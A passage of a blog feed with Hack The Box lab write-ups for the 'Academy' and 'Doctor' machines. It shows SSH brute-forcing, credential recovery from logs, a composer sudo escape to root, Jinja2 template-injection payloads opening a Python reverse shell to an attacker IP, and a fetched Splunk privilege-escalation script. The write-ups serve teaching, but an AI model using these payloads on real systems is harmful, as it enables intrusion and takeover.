&lt;span class="code-line"&gt;[DATA] max 15 tasks per 1 server, overall 15 tasks, 15 login tries (l:15/p:1), ~1 try per task&lt;/span&gt;
&lt;span class="code-line"&gt;[DATA] attacking ssh://10.129.39.166:22/&lt;/span&gt;
&lt;span class="code-line"&gt;[22][ssh] host: 10.129.39.166   login: cry0l1t3   password: mySup3rP4s5w0rd!!&lt;/span&gt;
&lt;span class="code-line"&gt;1 of 1 target successfully completed, 1 valid password found&lt;/span&gt;
&lt;span class="code-line"&gt;Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-11-11 08:34:09&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;$ ssh -l cry0l1t3 10.129.39.166&lt;/span&gt;
&lt;span class="code-line"&gt;cry0l1t3@10.129.39.166&amp;#39;s password:&lt;/span&gt;
&lt;span class="code-line"&gt;Welcome to Ubuntu 20.04.1 LTS (GNU/Linux 5.4.0-52-generic x86_64)&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;* Documentation:  https://help.ubuntu.com&lt;/span&gt;
&lt;span class="code-line"&gt;* Management:     https://landscape.canonical.com&lt;/span&gt;
&lt;span class="code-line"&gt;* Support:        https://ubuntu.com/advantage&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;  System information as of Wed 11 Nov 2020 01:53:21 PM UTC&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;  System load:             0.0&lt;/span&gt;
&lt;span class="code-line"&gt;  Usage of /:              44.5% of 15.68GB&lt;/span&gt;
&lt;span class="code-line"&gt;  Memory usage:            18%&lt;/span&gt;
&lt;span class="code-line"&gt;  Swap usage:              0%&lt;/span&gt;
&lt;span class="code-line"&gt;  Processes:               171&lt;/span&gt;
&lt;span class="code-line"&gt;  Users logged in:         0&lt;/span&gt;
&lt;span class="code-line"&gt;  IPv4 address for ens160: 10.129.39.166&lt;/span&gt;
&lt;span class="code-line"&gt;  IPv6 address for ens160: dead:beef::250:56ff:feb9:a424&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;0 updates can be installed immediately.&lt;/span&gt;
&lt;span class="code-line"&gt;0 of these updates are security updates.&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;Last login: Wed Nov  11 13:35:52 2020 from 10.10.14.20&lt;/span&gt;
&lt;span class="code-line"&gt;$ cat user.txt&lt;/span&gt;
&lt;span class="code-line"&gt;c3a5e57a709f0c1bdc6874b9ad7af1b1&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h1 id="root"&gt;Root&lt;/h1&gt;
&lt;h2 id="lateral-movement"&gt;lateral movement&lt;/h2&gt;
&lt;p&gt;Our user is in the &lt;code&gt;adm&lt;/code&gt; group. We can run &lt;code&gt;bash&lt;/code&gt; to have a better shell.&lt;/p&gt;
&lt;p&gt;$ id
uid=1002(cry0l1t3) gid=1002(cry0l1t3) groups=1002(cry0l1t3),4(adm)&lt;/p&gt;
&lt;p&gt;According to GNU/Linux &lt;a href="https://book.hacktricks.xyz/linux-unix/privilege-escalation"&gt;documentation&lt;/a&gt;
this group has access to &lt;code&gt;/var/log/&lt;/code&gt; but there is nothing of interest there. We
also have access to the &lt;code&gt;aureport&lt;/code&gt; command and list the &lt;code&gt;tty&lt;/code&gt; access containing
&lt;code&gt;mrb3n&lt;/code&gt; password.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;cry0l1t3@academy:/var/log$ aureport --tty&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;TTY Report&lt;/span&gt;
&lt;span class="code-line"&gt;===============================================&lt;/span&gt;
&lt;span class="code-line"&gt;# date time event auid term sess comm data&lt;/span&gt;
&lt;span class="code-line"&gt;===============================================&lt;/span&gt;
&lt;span class="code-line"&gt;Error opening config file (Permission denied)&lt;/span&gt;
&lt;span class="code-line"&gt;NOTE - using built-in logs: /var/log/audit/audit.log&lt;/span&gt;
&lt;span class="code-line"&gt;1. 08/12/2020 02:28:10 83 0 ? 1 sh &amp;quot;su mrb3n&amp;quot;,&amp;lt;nl&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;2. 08/12/2020 02:28:13 84 0 ? 1 su &amp;quot;mrb3n_Ac@d3my!&amp;quot;,&amp;lt;nl&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;3. 08/12/2020 02:28:24 89 0 ? 1 sh &amp;quot;whoami&amp;quot;,&amp;lt;nl&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h2 id="composer"&gt;Composer&lt;/h2&gt;
&lt;p&gt;We switch user &lt;code&gt;su&lt;/code&gt; to our new &lt;code&gt;mrb3n&lt;/code&gt; user and list our sudo persmission. We
have sudo access to &lt;code&gt;composer&lt;/code&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;cry0l1t3@academy:/var/log$ su mrb3n&lt;/span&gt;
&lt;span class="code-line"&gt;Password:&lt;/span&gt;
&lt;span class="code-line"&gt;$ bash&lt;/span&gt;
&lt;span class="code-line"&gt;mrb3n@academy:/home$ id&lt;/span&gt;
&lt;span class="code-line"&gt;uid=1001(mrb3n) gid=1001(mrb3n) groups=1001(mrb3n)&lt;/span&gt;
&lt;span class="code-line"&gt;mrb3n@academy:/home$ sudo -l&lt;/span&gt;
&lt;span class="code-line"&gt;[sudo] password for mrb3n:&lt;/span&gt;
&lt;span class="code-line"&gt;Matching Defaults entries for mrb3n on academy:&lt;/span&gt;
&lt;span class="code-line"&gt;    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;User mrb3n may run the following commands on academy:&lt;/span&gt;
&lt;span class="code-line"&gt;    (ALL) /usr/bin/composer&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Using &lt;a href="https://gtfobins.github.io/gtfobins/composer/"&gt;gtfobins&lt;/a&gt; we quickly
obtain a root shell and the root flag.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;mrb3n@academy:/home$ TF=$(mktemp -d)&lt;/span&gt;
&lt;span class="code-line"&gt;mrb3n@academy:/home$ echo &amp;#39;{&amp;quot;scripts&amp;quot;:{&amp;quot;x&amp;quot;:&amp;quot;/bin/sh -i 0&amp;lt;&amp;amp;3 1&amp;gt;&amp;amp;3 2&amp;gt;&amp;amp;3&amp;quot;}}&amp;#39; &amp;gt;$TF/composer.json&lt;/span&gt;
&lt;span class="code-line"&gt;mrb3n@academy:/home$ sudo composer --working-dir=$TF run-script x&lt;/span&gt;
&lt;span class="code-line"&gt;PHP Warning:  PHP Startup: Unable to load dynamic library &amp;#39;mysqli.so&amp;#39; (tried: /usr/lib/php/20190902/mysqli.so (/usr/lib/php/20190902/mysqli.so: undefined symbol: mysqlnd_global_stats), /usr/lib/php/20190902/mysqli.so.so (/usr/lib/php/20190902/mysqli.so.so: cannot open shared object file: No such file or directory)) in Unknown on line 0&lt;/span&gt;
&lt;span class="code-line"&gt;PHP Warning:  PHP Startup: Unable to load dynamic library &amp;#39;pdo_mysql.so&amp;#39; (tried: /usr/lib/php/20190902/pdo_mysql.so (/usr/lib/php/20190902/pdo_mysql.so: undefined symbol: mysqlnd_allocator), /usr/lib/php/20190902/pdo_mysql.so.so (/usr/lib/php/20190902/pdo_mysql.so.so: cannot open shared object file: No such file or directory)) in Unknown on line 0&lt;/span&gt;
&lt;span class="code-line"&gt;Do not run Composer as root/super user! See https://getcomposer.org/root for details&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;gt; /bin/sh -i 0&amp;lt;&amp;amp;3 1&amp;gt;&amp;amp;3 2&amp;gt;&amp;amp;3&lt;/span&gt;
&lt;span class="code-line"&gt;# id&lt;/span&gt;
&lt;span class="code-line"&gt;uid=0(root) gid=0(root) groups=0(root)&lt;/span&gt;
&lt;span class="code-line"&gt;# cat /root/root.txt&lt;/span&gt;
&lt;span class="code-line"&gt;c54ee4bf2a048550483176f6cb528d95&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h1 id="wrapping-up"&gt;Wrapping up&lt;/h1&gt;
&lt;p&gt;An easy machine mostly based on public exploit and enumeration. I will recommand
it to begginers.&lt;/p&gt;</content><category term="security"></category><category term="security"></category><category term="boot2root"></category><category term="HTB"></category><category term="Linux"></category><category term="laravel"></category><category term="composer"></category></entry><entry><title>HTB: Doctor</title><link href="https://maggick.fr/2021/02/htb-doctor.html" rel="alternate"></link><published>2021-02-07T18:15:00+01:00</published><updated>2021-02-07T18:15:00+01:00</updated><author><name>maggick</name></author><id>tag:maggick.fr,2021-02-07:/2021/02/htb-doctor.html</id><summary type="html">&lt;p&gt;&lt;img alt="Doctor card" class="align-left" src="/media/2021.02/doctor_card.png" width="262"/&gt;&lt;/p&gt;
&lt;p&gt;This is a writeup about a retired HacktheBox machine:
&lt;a href="https://www.hackthebox.eu/home/machines/profile/278"&gt;Doctor&lt;/a&gt; created by
&lt;a href="https://www.hackthebox.eu/home/users/profile/94858"&gt;egotisticalSW&lt;/a&gt;
and publish on September 26, 2020.
This box is classified as an easy machine. The user part implied a server side
template injection and finding a needle in a haystack. The root part required to
use a Splunk exploit to elevate our privileges.&lt;/p&gt;
</summary><content type="html">&lt;p&gt;&lt;img class="align-left" src="/media/2021.02/doctor_card.png" alt="Doctor card" width="262"&gt;&lt;/p&gt;
&lt;p&gt;This is a writeup about a retired HacktheBox machine:
&lt;a href="https://www.hackthebox.eu/home/machines/profile/278"&gt;Doctor&lt;/a&gt; created by
&lt;a href="https://www.hackthebox.eu/home/users/profile/94858"&gt;egotisticalSW&lt;/a&gt;
and publish on September 26, 2020.
This box is classified as an easy machine. The user part implied a server side
template injection and finding a needle in a haystack. The root part required to
use a Splunk exploit to elevate our privileges.&lt;/p&gt;


&lt;h1 id="user"&gt;User&lt;/h1&gt;
&lt;h2 id="recon"&gt;Recon&lt;/h2&gt;
&lt;p&gt;We start with an nmap scan. Only the ports 22 (SSH), 80 (HTTP) and 8080 (splunk web interface) are open.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;# Nmap 7.80 scan initiated Mon Sep 28 06:35:31 2020 as: nmap -p- -oN nmap -sSV 10.10.10.209&lt;/span&gt;
&lt;span class="code-line"&gt;Nmap scan report for 10.10.10.209&lt;/span&gt;
&lt;span class="code-line"&gt;Host is up (0.077s latency).&lt;/span&gt;
&lt;span class="code-line"&gt;Not shown: 65532 filtered ports&lt;/span&gt;
&lt;span class="code-line"&gt;PORT     STATE SERVICE  VERSION&lt;/span&gt;
&lt;span class="code-line"&gt;22/tcp   open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)&lt;/span&gt;
&lt;span class="code-line"&gt;80/tcp   open  http     Apache httpd 2.4.41 ((Ubuntu))&lt;/span&gt;
&lt;span class="code-line"&gt;8089/tcp open  ssl/http Splunkd httpd&lt;/span&gt;
&lt;span class="code-line"&gt;Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .&lt;/span&gt;
&lt;span class="code-line"&gt;# Nmap done at Mon Sep 28 06:37:56 2020 -- 1 IP address (1 host up) scanned in 145.15 seconds&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h2 id="web-port-8089"&gt;Web - port 8089&lt;/h2&gt;
&lt;p&gt;On the port 8089 we have a splunk running (as found by nmap) but we don't have
access to the different function as we don't know any credentials.&lt;/p&gt;
&lt;p&gt;&lt;img alt="Front page and contact email" src="/media/2021.02/doctor_00.png"&gt;&lt;/p&gt;
&lt;p&gt;An access to this function will have allowed us to
&lt;a href="https://github.com/cnotin/SplunkWhisperer2"&gt;have a remote code execution on the server&lt;/a&gt;
or &lt;a href="https://github.com/tevora-threat/splunk_local_privesc"&gt;allowed us to elevate our privileges on the box&lt;/a&gt;.&lt;/p&gt;
&lt;h2 id="web-port-80"&gt;Web - port 80&lt;/h2&gt;
&lt;p&gt;The website is about healthcare and doctors. We also see an email contact address
on the front page with the domain &lt;em&gt;doctors.htb&lt;/em&gt; (note the &lt;em&gt;s&lt;/em&gt; at the end).&lt;/p&gt;
&lt;p&gt;&lt;img alt="Front page and contact email" src="/media/2021.02/doctor_01.png"&gt;&lt;/p&gt;
&lt;p&gt;We had the domain to &lt;code&gt;/etc/hosts&lt;/code&gt; and browse to it. The website is a "secure"
messaging application with a self sign-in function.&lt;/p&gt;
&lt;p&gt;&lt;img alt="Doctor Secure Messaging" src="/media/2021.02/doctor_02.png"&gt;&lt;/p&gt;
&lt;p&gt;We create an account and post a message.&lt;/p&gt;
&lt;p&gt;&lt;img alt="Doctor Secure Messaging" src="/media/2021.02/doctor_03.png"&gt;&lt;/p&gt;
&lt;p&gt;When looking at the page source code we found a comment about the archive
function:
&lt;code&gt;&amp;lt;!--archive still under beta testing&amp;lt;a class="nav-item nav-link" href="/archive"&amp;gt;Archive&amp;lt;/a&amp;gt;--&amp;gt;&lt;/code&gt;&lt;/p&gt;
&lt;h3 id="ssti"&gt;SSTI&lt;/h3&gt;
&lt;p&gt;We check for common vulnerabilities and found out that the application is
vulnerable to &lt;a href="https://portswigger.net/web-security/server-side-template-injection"&gt;server side template injection&lt;/a&gt;
in the title as when our title is &lt;code&gt;{{7*7}}&lt;/code&gt; when can see the operation result
(49) in the archive.&lt;/p&gt;
&lt;p&gt;&lt;img alt="Message with SSTI test payload" src="/media/2021.02/doctor_04.png"&gt;&lt;/p&gt;
&lt;p&gt;&lt;img alt="Payload executed in the archive section" src="/media/2021.02/doctor_05.png"&gt;&lt;/p&gt;
&lt;p&gt;We can use this injection to &lt;a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection"&gt;execute command on the system&lt;/a&gt;.
After a few test we know that python is on the box and can run a few commands.
The payload below runs &lt;code&gt;id&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;&lt;code&gt;{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.14.121\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/id\"]);'").read().zfill(417)}}{%endif%}{% endfor %}&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;We (obviously) run a netcat listener to catch the command's output.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;kali@kali:~/pown/htb_doctor$ nc -l -p 4444&lt;/span&gt;
&lt;span class="code-line"&gt;uid=1001(web) gid=1001(web) groups=1001(web),4(adm)&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We then go for a reverse shell with the following payload be careful with the
quotes and escaped quotes).&lt;/p&gt;
&lt;p&gt;&lt;code&gt;{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.14.121\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); import pty; pty.spawn(\"/bin/bash\");'").read().zfill(417)}}{%endif%}{% endfor %}&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;That allow us to get a reverse shell on the box.&lt;/p&gt;
&lt;h2 id="enumeration"&gt;Enumeration&lt;/h2&gt;
&lt;p&gt;After &lt;em&gt;a lot&lt;/em&gt; of enumeration both
&lt;a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md"&gt;manually&lt;/a&gt;
and using tools as
&lt;a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS"&gt;linPEAS&lt;/a&gt;
we found out that there is &lt;code&gt;backup&lt;/code&gt; file in &lt;code&gt;/var/log/apache2&lt;/code&gt; containing a call
to the password reset function but the user put its password instead of its
email.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;web@doctor:/var/log/apache2$ grep password backup&lt;/span&gt;
&lt;span class="code-line"&gt;grep password backup&lt;/span&gt;
&lt;span class="code-line"&gt;10.10.14.4 - - [05/Sep/2020:11:17:34 +2000] &amp;quot;POST /reset_password?email=Guitar123&amp;quot; 500 453 &amp;quot;http://doctor.htb/reset_password&amp;quot;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;That password allow us to connect as &lt;code&gt;shaun&lt;/code&gt; using the switch user &lt;code&gt;su&lt;/code&gt; command
and get the user flag.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;web@doctor:/var/log/apache2$ su shaun&lt;/span&gt;
&lt;span class="code-line"&gt;su shaun&lt;/span&gt;
&lt;span class="code-line"&gt;Password: Guitar123&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;shaun@doctor:/var/log/apache2$ cat /home/shaun/user.txt&lt;/span&gt;
&lt;span class="code-line"&gt;cat /home/shaun/user.txt&lt;/span&gt;
&lt;span class="code-line"&gt;2b14d9d9ff996cfb2e4fb96e6db82631&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h1 id="root"&gt;Root&lt;/h1&gt;
&lt;p&gt;Now that we have a username and a password we can try them against the Splunk
service. And they are working!&lt;/p&gt;
&lt;p&gt;We transfer the &lt;a href="https://github.com/tevora-threat/splunk_local_privesc"&gt;script mentioned above&lt;/a&gt;
to the box using &lt;code&gt;python -m http.server&lt;/code&gt; on our kali box.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;shaun@doctor:/tmp$ wget 10.10.14.121:8000/spelunker.sh&lt;/span&gt;
&lt;span class="code-line"&gt;wget 10.10.14.121:8000/spelunker.sh&lt;/span&gt;
&lt;span class="code-line"&gt;--2020-09-29 11:22:03--  http://10.10.14.121:8000/spelunker.sh&lt;/span&gt;
&lt;span class="code-line"&gt;Connecting to 10.10.14.121:8000... connected.&lt;/span&gt;
&lt;span class="code-line"&gt;HTTP request sent, awaiting response... 200 OK&lt;/span&gt;
&lt;span class="code-line"&gt;Length: 2503 (2,4K) [text/x-sh]&lt;/span&gt;
&lt;span class="code-line"&gt;Saving to: ‘spelunker.sh.1’&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;spelunker.sh.1      100%[===================&amp;gt;]   2,44K  --.-KB/s    in 0s&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;2020-09-29 11:22:03 (254 MB/s) - ‘spelunker.sh.1’ saved [2503/2503]&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Then, we give the execution permission to the script and run it.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;shaun@doctor:/tmp$ chmod +x spelunker.sh.1&lt;/span&gt;
&lt;span class="code-line"&gt;chmod +x spelunker.sh.1&lt;/span&gt;
&lt;span class="code-line"&gt;shaun@doctor:/tmp$ ./spelunker.sh.1&lt;/span&gt;
&lt;span class="code-line"&gt;./spelunker.sh.1&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;[!] SPLUNK LOCAL PRIVESC [!]&lt;/span&gt;
&lt;span class="code-line"&gt;[!] This tool assumes the creds are admin:changeme&lt;/span&gt;
&lt;span class="code-line"&gt;[!] and the port is 8089&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;[*] Creating a tmp workspace and moving there...&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;[*] Creating the splunk app...&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;[*] Creating the payload...&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;Tarballing the App and removing temp files...&lt;/span&gt;
&lt;span class="code-line"&gt;./APPY/&lt;/span&gt;
&lt;span class="code-line"&gt;./APPY/bin/&lt;/span&gt;
&lt;span class="code-line"&gt;./APPY/bin/pay.sh&lt;/span&gt;
&lt;span class="code-line"&gt;./APPY/local/&lt;/span&gt;
&lt;span class="code-line"&gt;./APPY/local/inputs.conf&lt;/span&gt;
&lt;span class="code-line"&gt;[*] App should be created...&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;[*] Installing the malicious splunk app....&lt;/span&gt;
&lt;span class="code-line"&gt;HTTP/1.1 201 Created&lt;/span&gt;
&lt;span class="code-line"&gt;Date: Tue, 29 Sep 2020 09:22:31 GMT&lt;/span&gt;
&lt;span class="code-line"&gt;Expires: Thu, 26 Oct 1978 00:00:00 GMT&lt;/span&gt;
&lt;span class="code-line"&gt;Cache-Control: no-store, no-cache, must-revalidate, max-age=0&lt;/span&gt;
&lt;span class="code-line"&gt;Content-Type: text/xml; charset=UTF-8&lt;/span&gt;
&lt;span class="code-line"&gt;X-Content-Type-Options: nosniff&lt;/span&gt;
&lt;span class="code-line"&gt;Content-Length: 4342&lt;/span&gt;
&lt;span class="code-line"&gt;Vary: Cookie, Authorization&lt;/span&gt;
&lt;span class="code-line"&gt;Connection: Close&lt;/span&gt;
&lt;span class="code-line"&gt;X-Frame-Options: SAMEORIGIN&lt;/span&gt;
&lt;span class="code-line"&gt;Server: Splunkd&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;lt;?xml version=&amp;quot;1.0&amp;quot; encoding=&amp;quot;UTF-8&amp;quot;?&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;lt;?xml-stylesheet type=&amp;quot;text/xml&amp;quot; href=&amp;quot;/static/atom.xsl&amp;quot;?&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;lt;feed xmlns=&amp;quot;http://www.w3.org/2005/Atom&amp;quot; xmlns:s=&amp;quot;http://dev.splunk.com/ns/rest&amp;quot; xmlns:opensearch=&amp;quot;http://a9.com/-/spec/opensearch/1.1/&amp;quot;&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;  &amp;lt;title&amp;gt;localapps&amp;lt;/title&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;  &amp;lt;id&amp;gt;https://127.0.0.1:8089/services/apps/local&amp;lt;/id&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;  &amp;lt;updated&amp;gt;2020-09-29T11:22:31+02:00&amp;lt;/updated&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;  &amp;lt;generator build=&amp;quot;a1a6394cc5ae&amp;quot; version=&amp;quot;8.0.5&amp;quot;/&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;  &amp;lt;author&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &amp;lt;name&amp;gt;Splunk&amp;lt;/name&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;  &amp;lt;/author&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;  &amp;lt;link href=&amp;quot;/services/apps/local/_new&amp;quot; rel=&amp;quot;create&amp;quot;/&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;  &amp;lt;link href=&amp;quot;/services/apps/local/_reload&amp;quot; rel=&amp;quot;_reload&amp;quot;/&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;  &amp;lt;opensearch:totalResults&amp;gt;1&amp;lt;/opensearch:totalResults&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;  &amp;lt;opensearch:itemsPerPage&amp;gt;30&amp;lt;/opensearch:itemsPerPage&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;  &amp;lt;opensearch:startIndex&amp;gt;0&amp;lt;/opensearch:startIndex&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;  &amp;lt;s:messages/&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;  &amp;lt;entry&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &amp;lt;title&amp;gt;APPY&amp;lt;/title&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &amp;lt;id&amp;gt;https://127.0.0.1:8089/servicesNS/nobody/system/apps/local/APPY&amp;lt;/id&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &amp;lt;updated&amp;gt;1970-01-01T01:00:00+01:00&amp;lt;/updated&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &amp;lt;link href=&amp;quot;/servicesNS/nobody/system/apps/local/APPY&amp;quot; rel=&amp;quot;alternate&amp;quot;/&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &amp;lt;author&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;      &amp;lt;name&amp;gt;nobody&amp;lt;/name&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &amp;lt;/author&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &amp;lt;link href=&amp;quot;/servicesNS/nobody/system/apps/local/APPY&amp;quot; rel=&amp;quot;list&amp;quot;/&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &amp;lt;link href=&amp;quot;/servicesNS/nobody/system/apps/local/APPY/_reload&amp;quot; rel=&amp;quot;_reload&amp;quot;/&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &amp;lt;link href=&amp;quot;/servicesNS/nobody/system/apps/local/APPY&amp;quot; rel=&amp;quot;edit&amp;quot;/&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &amp;lt;link href=&amp;quot;/servicesNS/nobody/system/apps/local/APPY&amp;quot; rel=&amp;quot;remove&amp;quot;/&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &amp;lt;link href=&amp;quot;/servicesNS/nobody/system/apps/local/APPY/package&amp;quot; rel=&amp;quot;package&amp;quot;/&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &amp;lt;content type=&amp;quot;text/xml&amp;quot;&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;      &amp;lt;s:dict&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &amp;lt;s:key name=&amp;quot;check_for_updates&amp;quot;&amp;gt;1&amp;lt;/s:key&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &amp;lt;s:key name=&amp;quot;configured&amp;quot;&amp;gt;0&amp;lt;/s:key&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &amp;lt;s:key name=&amp;quot;core&amp;quot;&amp;gt;0&amp;lt;/s:key&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &amp;lt;s:key name=&amp;quot;disabled&amp;quot;&amp;gt;0&amp;lt;/s:key&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &amp;lt;s:key name=&amp;quot;eai:acl&amp;quot;&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;          &amp;lt;s:dict&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;            &amp;lt;s:key name=&amp;quot;app&amp;quot;&amp;gt;system&amp;lt;/s:key&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;            &amp;lt;s:key name=&amp;quot;can_change_perms&amp;quot;&amp;gt;1&amp;lt;/s:key&amp;gt;&lt;/span&gt;
